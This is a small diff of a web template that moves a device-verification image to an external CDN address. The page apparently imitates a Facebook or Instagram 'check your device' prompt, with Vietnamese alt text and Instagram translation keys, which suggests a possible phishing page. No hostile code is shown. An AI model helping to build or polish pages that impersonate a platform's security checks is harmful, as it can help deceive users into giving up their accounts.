@@ -57,7 +57,7 @@
             <p class="text-[14px] text-black leading-relaxed mb-5">
                 {{ __('instagram.check_device_notification_message') }}</p>
             <div class="rounded-xl overflow-hidden mb-5">
-                <img src="images/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
             </div>
             <div class="flex items-center gap-3 mb-5">
                 <i class="fa-light fa-circle-notch fa-spin"></i>
